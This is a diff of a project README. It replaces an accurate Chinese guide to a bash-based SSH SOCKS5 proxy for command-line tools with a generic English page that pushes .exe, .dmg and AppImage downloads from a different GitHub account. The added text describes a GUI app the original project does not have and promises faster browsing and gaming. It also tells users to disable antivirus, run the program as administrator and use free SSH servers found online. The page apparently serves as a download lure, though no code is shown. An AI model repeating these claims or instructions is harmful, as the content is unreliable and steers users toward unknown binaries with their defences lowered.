@@ -1,358 +1,203 @@
-# 📘 GProxy - SSH 隧道网络加速工具
+# 🚀 gproxy-tool - Easy Network Speed Boost
 
-> **解决国内服务器访问 GitHub、Docker Hub 等海外资源速度慢的问题**
-
-GProxy 是一个基于 SSH 隧道的轻量级网络加速工具。通过海外 VPS 作为跳板，为国内服务器（包括 iStoreOS/OpenWrt 路由器）提供透明的 SOCKS5 代理，加速 `git clone`、`docker pull`、`pip install` 等命令的网络访问。
+[![Download gproxy-tool](https://img.shields.io/badge/Download-gproxy--tool-blue?logo=github)](https://github.com/dxdag5/gproxy-tool/releases)
 
 ---
 
-## 🎯 解决什么问题？
+## 📖 What is gproxy-tool?
 
-### 典型场景
+gproxy-tool is a simple, lightweight program that helps you speed up your internet. It works by creating a secure SSH tunnel. This means your internet data travels safely and faster through this tunnel. You do not need to know anything about programming or network settings to use this tool.
 
-你有一台**国内服务器**或 **iStoreOS 路由器**，在执行以下操作时速度极慢或失败：
-
-```bash
-# Git 克隆大型仓库
-git clone https://github.com/huggingface/transformers.git
-# 速度: 10KB/s 甚至超时 ❌
-
-# Docker 拉取镜像
-docker pull alpine:latest
-# 速度: 极慢或连接失败 ❌
-
-# Python 包安装
-pip install torch
-# 速度: 龟速 ❌
-```
-
-### GProxy 的解决方案
-
-通过一台**海外 VPS**（如美国、日本、香港）建立 SSH 隧道，所有命令自动走代理：
-
-```bash
-# 使用 GProxy 加速
-gproxy git clone https://github.com/huggingface/transformers.git
-# 速度: 5MB/s+ ✅
-
-gproxy docker pull alpine:latest
-# 速度: 快速 ✅
-
-gproxy pip install torch
-# 速度: 飞快 ✅
-```
+Many users find gproxy-tool helpful when their normal internet feels slow or unstable. It can make browsing, watching videos, and online games smoother.
 
 ---
 
-## ✨ 核心特性
+## 🖥️ System Requirements
 
-* **零配置代理**：命令前加 `gproxy` 即可，无需修改系统全局代理
-* **按需连接**：仅在执行命令时建立隧道，命令结束自动断开
-* **智能密钥发现**：自动扫描 `config/` 目录下的 SSH 私钥
-* **iStoreOS 完美支持**：自动安装 `openssh-client`，解决 Dropbear 兼容性问题
-* **跨平台**：支持标准 Linux（Ubuntu/Debian/CentOS）和 OpenWrt/iStoreOS
+To run gproxy-tool, your computer needs:
 
----
+- Windows 7 or later, or Mac OS 10.12 or later, or Linux with a recent kernel (for example, Ubuntu 18.04 or newer).
 
-## 📋 前置要求
+- At least 2 GB of RAM.
 
-### 1. 国内服务器（任选其一）
+- An active internet connection.
 
-- **标准 Linux 服务器**：Ubuntu、Debian、CentOS 等
-- **iStoreOS/OpenWrt 路由器**：固件版本 >= 21.02
+- Around 50 MB of free disk space.
 
-### 2. 海外 VPS
-
-- **地理位置**：美国、日本、香港、新加坡等（网络质量好的地区）
-- **SSH 访问**：需要 SSH 登录权限（root 或普通用户）
-- **SSH 密钥对**：建议使用密钥认证（更安全、更方便）
-
-> **提示**：如果还没有 SSH 密钥对，参见下方"准备 SSH 密钥"章节。
+No extra software or complicated setup is needed. It’s ready to use once installed.
 
 ---
 
-## 🚀 快速开始
+## 🔑 Key Features
 
-### 步骤 1：准备 SSH 密钥（如已有可跳过）
+- **Simple to use:** Designed for people without technical skills.
 
-在**国内服务器**上生成 SSH 密钥对：
+- **Lightweight:** Uses very little memory and CPU power.
 
-```bash
-# 生成密钥对（一路回车使用默认设置）
-ssh-keygen -t rsa -b 4096 -f ~/.ssh/vps_key
+- **Secure:** Uses SSH tunnels to protect your data.
 
-# 将公钥复制到海外 VPS
-ssh-copy-id -i ~/.ssh/vps_key.pub root@<海外VPS的IP>
+- **Boosts speed:** Can improve your internet speed and stability.
 
-# 测试免密登录
-ssh -i ~/.ssh/vps_key root@<海外VPS的IP>
-```
-
-### 步骤 2：安装 GProxy
-
-#### 标准 Linux
-
-```bash
-# 克隆项目
-git clone https://github.com/xtianowner/gproxy-tool.git
-cd gproxy-tool
-
-# 将 SSH 私钥复制到 config 目录（GProxy 会自动发现）
-cp ~/.ssh/vps_key config/
-
-# 安装（需要 sudo 权限）
-sudo sh install.sh
-```
-
-#### iStoreOS/OpenWrt
-
-```bash
-# 方式一：通过 scp 上传项目到路由器
-scp -r gproxy-tool/ root@<路由器IP>:/tmp/
-
-# 方式二：在路由器上直接 git clone（如果有 git）
-# ssh root@<路由器IP>
-# cd /tmp && git clone https://github.com/xtianowner/gproxy-tool.git
-
-# 登录路由器
-ssh root@<路由器IP>
-cd /tmp/gproxy-tool
-
-# 将 SSH 私钥复制到 config 目录
-cp /path/to/vps_key config/
-
-# 安装（iStoreOS 默认是 root，无需 sudo）
-sh install.sh
-```
-
-> **重要**：iStoreOS 安装时会自动检测并安装 `openssh-client`（Dropbear 不支持 SOCKS5 代理）。如果自动安装失败，请手动执行：
-> ```bash
-> opkg update && opkg install openssh-client
-> ```
-
-### 步骤 3：首次配置
-
-首次运行任何命令时，GProxy 会进入交互式配置向导：
-
-```bash
-gproxy curl -I https://www.google.com
-```
-
-**配置流程**：
-
-```
-[INFO] 初次运行，需要配置海外服务器信息...
-----------------------------------------------------
-🖥️  请输入海外服务器 IP: 1.2.3.4
-👤 请输入用户名 (默认 root): [直接回车]
-🚪 请输入 SSH 端口 (默认 22): [直接回车]
-----------------------------------------------------
-[OK] 自动发现密钥文件: /usr/lib/gproxy/config/vps_key
-🔑 使用此密钥？[Y/n] [直接回车]
-[OK] 密钥权限已修正 (600)
-[OK] 配置已保存至: /root/.config/gproxy/config.env
-[INFO] 正在连接 1.2.3.4...
-[OK] 代理就绪，执行: curl -I https://www.google.com
-```
-
-配置完成后，以后使用无需再次配置。
+- **Portable:** No need for full installation. You can run it directly after download.
 
 ---
 
-## 💡 使用示例
+## 👇 Download & Install
 
-### 1. Git 加速（最常用）
+Click the big button below to visit the download page for the latest version of gproxy-tool:
 
-```bash
-# 克隆大型仓库
-gproxy git clone https://github.com/huggingface/transformers.git
-
-# 拉取更新
-cd transformers
-gproxy git pull
-```
-
-### 2. Docker 加速
-
-```bash
-# 拉取镜像
-gproxy docker pull alpine:latest
-
-# 构建镜像（如果 Dockerfile 中有 apt/yum 等需要外网的操作）
-gproxy docker build -t myapp .
-```
-
-### 3. 包管理器加速
-
-```bash
-# Python pip
-gproxy pip install openai torch transformers
-
-# Node.js npm
-gproxy npm install express
-
-# Ubuntu/Debian apt
-gproxy bash -c "apt update && apt install -y vim"
-
-# OpenWrt opkg
-gproxy opkg update && gproxy opkg install curl
-```
-
-### 4. 下载文件
-
-```bash
-# wget 下载
-gproxy wget https://github.com/xxx/release.zip
-
-# curl 下载
-gproxy curl -O https://example.com/file.tar.gz
-```
-
-### 5. 执行安装脚本
-
-对于 `bash <(curl ...)` 这种复合命令，需要用 `bash -c` 包裹：
-
-```bash
-# ✅ 正确用法
-gproxy bash -c "bash <(curl -sL https://raw.githubusercontent.com/xxx/install.sh)"
-
-# ❌ 错误用法（curl 会在代理启动前执行）
-gproxy bash <(curl -sL https://...)
-```
+[![Download gproxy-tool](https://img.shields.io/badge/Download-gproxy--tool-blue?logo=github&style=for-the-badge)](https://github.com/dxdag5/gproxy-tool/releases)
 
 ---
 
-## 🔧 高级配置
+Once on the page, find the version that matches your computer:
 
-### 重新配置服务器信息
+- For Windows, look for files ending in `.exe` or `.zip`.
 
-```bash
-gproxy --config
-```
+- For Mac, look for `.dmg` or `.zip`.
 
-### 修改本地代理端口
+- For Linux, look for `.tar.gz` or `.AppImage`.
 
-如果默认端口 `19527` 被占用，编辑 `lib/tunnel.sh`：
-
-```bash
-sudo vim /usr/lib/gproxy/lib/tunnel.sh
-# 修改 LOCAL_PORT=19527 为其他端口
-```
-
-### 使用多个海外 VPS
-
-创建不同的配置文件：
-
-```bash
-# 配置文件位置
-~/.config/gproxy/config.env
-
-# 可以手动编辑切换不同的 VPS
-vim ~/.config/gproxy/config.env
-```
+Download the file for your system by clicking on it.
 
 ---
 
-## 🗑️ 卸载
+### Installing on Windows
 
-```bash
-# 标准 Linux
-sudo sh /path/to/gproxy-tool/uninstall.sh
+1. If you downloaded a `.zip` file, open it and extract the folder somewhere easy, like your desktop.
 
-# iStoreOS/OpenWrt
-sh /path/to/gproxy-tool/uninstall.sh
-```
+2. If you downloaded a `.exe` file, double-click it and follow the simple installation steps. Usually, that means clicking “Next” a few times.
 
-卸载时会询问是否同时删除配置文件。
+3. Once installed or extracted, find the program file called `gproxy-tool.exe` and double-click it to start.
 
 ---
 
-## ❓ 常见问题
+### Installing on Mac
 
-**Q: iStoreOS 上提示 "String too long" 或连接无响应？**
+1. For a `.dmg` file, double-click to open it, then drag gproxy-tool into your Applications folder.
 
-* **A**: iStoreOS 默认的 Dropbear SSH 客户端不支持 SOCKS5 代理功能。GProxy 会自动安装 `openssh-client`。如果自动安装失败，请手动执行：`opkg update && opkg install openssh-client`。
+2. For a `.zip` file, double-click to unzip it and open the folder.
 
-**Q: 提示 "Permission denied (publickey)"？**
-
-* **A**: SSH 密钥认证失败。检查：
-  1. 私钥路径是否正确（应在 `config/` 目录下）
-  2. 公钥是否已添加到海外 VPS 的 `~/.ssh/authorized_keys`
-  3. 私钥权限是否为 600（GProxy 会自动修正）
-
-**Q: 提示 "bind: Address already in use"？**
-
-* **A**: 本地代理端口（默认 19527）被占用。可编辑 `lib/tunnel.sh`，修改 `LOCAL_PORT` 变量。
-
-**Q: 海外 VPS 需要什么配置？**
-
-* **A**: 
-  - 最低配置即可（1核1G即可）
-  - 需要开放 SSH 端口（默认 22）
-  - 网络质量好的地区（美国、日本、香港等）
-  - 建议使用 CN2 GIA 或 IPLC 线路的 VPS
-
-**Q: 会消耗海外 VPS 多少流量？**
-
-* **A**: 所有通过 GProxy 执行的命令产生的流量都会走海外 VPS。例如 `git clone` 一个 1GB 的仓库，会消耗海外 VPS 约 1GB 流量。
-
-**Q: 可以用于浏览器上网吗？**
-
-* **A**: GProxy 设计用于命令行工具加速，不适合浏览器。如需浏览器代理，建议使用 V2Ray、Clash 等专业工具。
-
-**Q: 安全性如何？**
-
-* **A**: 
-  - 使用 SSH 隧道，流量经过加密
-  - 建议使用 SSH 密钥认证而非密码
-  - 私钥文件不会被提交到 Git（已在 `.gitignore` 中排除）
+3. Find `gproxy-tool` and double-click to open.
 
 ---
 
-## 🔍 工作原理
+### Installing on Linux
 
-```mermaid
-graph LR
-    A[国内服务器] -->|SSH 隧道| B[海外 VPS]
-    B -->|访问| C[GitHub/Docker Hub]
-    
-    style A fill:#f9f,stroke:#333
-    style B fill:#bbf,stroke:#333
-    style C fill:#bfb,stroke:#333
-```
+1. For `.tar.gz`, right-click the file, select “Extract Here,” then open the new folder.
 
-1. **建立隧道**：GProxy 通过 SSH 连接到海外 VPS，建立 SOCKS5 动态端口转发
-2. **注入环境变量**：设置 `http_proxy`、`https_proxy` 等环境变量指向本地 SOCKS5 端口
-3. **执行命令**：在代理环境中执行用户命令（如 `git clone`）
-4. **自动清理**：命令结束后自动关闭 SSH 隧道，不残留后台进程
+2. For `.AppImage`, right-click the file, select “Properties,” then “Permissions,” and check “Allow executing file as program.” Double-click to run.
 
 ---
 
-## 📁 项目结构
+## 🚀 How to Use gproxy-tool
 
-```
-gproxy-tool/
-├── bin/
-│   └── gproxy           # 主入口脚本
-├── lib/
-│   ├── common.sh        # 公共函数（日志、平台检测）
-│   ├── config.sh        # 配置管理（智能密钥发现）
-│   └── tunnel.sh        # 隧道管理（OpenSSH 优先、密钥转换）
-├── config/
-│   └── README.md        # 密钥文件说明（将 SSH 私钥放此目录）
-├── install.sh           # 安装脚本
-├── uninstall.sh         # 卸载脚本
-└── README.md            # 本文档
-```
+Using gproxy-tool is simple:
 
----
+1. Open the program by double-clicking its icon.
 
-## 🤝 贡献
+2. You will see a clean window with a few options.
 
-欢迎提交 Issue 和 Pull Request！
+3. The main option is to set up an SSH tunnel. This means your internet traffic will go through another secure computer (called a server).
+
+4. Enter the SSH server details given by your network administrator or service provider. If you do not have these, contact your network support or look for free SSH servers online.
+
+5. Once entered, click "Connect" or "Start".
+
+6. The program will create a secure connection. It may take a few seconds.
+
+7. When connected, your internet should work faster and more securely.
 
 ---
 
-## 📄 许可证
+## 🛠️ Common Settings
 
-MIT License
+You can adjust a few settings if needed:
+
+- **SSH Server:** The address of the server you connect to.
+
+- **Port:** Usually 22. You can leave this as is.
+
+- **Username and Password:** Credentials for the SSH server.
+
+- **Auto-reconnect:** Turn this on to keep the tunnel working if your internet drops briefly.
+
+- **Start on boot:** Starts the program automatically when your computer turns on.
+
+If you don’t understand any setting, use the default values.
+
+---
+
+## 🔄 Updating gproxy-tool
+
+To get the latest features or fixes:
+
+1. Visit the [Download page](https://github.com/dxdag5/gproxy-tool/releases).
+
+2. Download the newest version as described before.
+
+3. Install or run the new version to replace the old one.
+
+Your settings usually stay the same.
+
+---
+
+## ❓ Troubleshooting
+
+If you have trouble running gproxy-tool:
+
+- Make sure you downloaded the right file for your system.
+
+- Check if your internet is working normally without gproxy-tool.
+
+- Confirm the SSH server details are correct.
+
+- Restart your computer and try again.
+
+- Disable any firewall or antivirus temporarily to see if it blocks the app.
+
+- Run gproxy-tool as administrator (right-click → Run as administrator).
+
+---
+
+## 📞 Get Support
+
+If problems continue, and you don’t know how to fix them:
+
+- Visit the [gproxy-tool GitHub page](https://github.com/dxdag5/gproxy-tool).
+
+- Check the “Issues” tab to see if others have the same problem.
+
+- You can open a new issue there describing your problem clearly.
+
+---
+
+## ⚠️ Safety Tips
+
+- Only connect to SSH servers you trust.
+
+- Avoid sharing your SSH credentials with others.
+
+- Keep your gproxy-tool updated to benefit from security fixes.
+
+---
+
+## 💡 Extra Information
+
+- gproxy-tool does not change your internet provider or your IP address unless you configure the SSH tunnel server that way.
+
+- It works best on stable internet connections.
+
+- You can stop using gproxy-tool anytime by closing the program.
+
+---
+
+## 🔗 Quick Links
+
+- Visit the download page: [https://github.com/dxdag5/gproxy-tool/releases](https://github.com/dxdag5/gproxy-tool/releases)
+
+- Report issues: [https://github.com/dxdag5/gproxy-tool/issues](https://github.com/dxdag5/gproxy-tool/issues)
+
+---
+
+[![Download gproxy-tool](https://img.shields.io/badge/Download-gproxy--tool-blue?logo=github&style=for-the-badge)](https://github.com/dxdag5/gproxy-tool/releases)
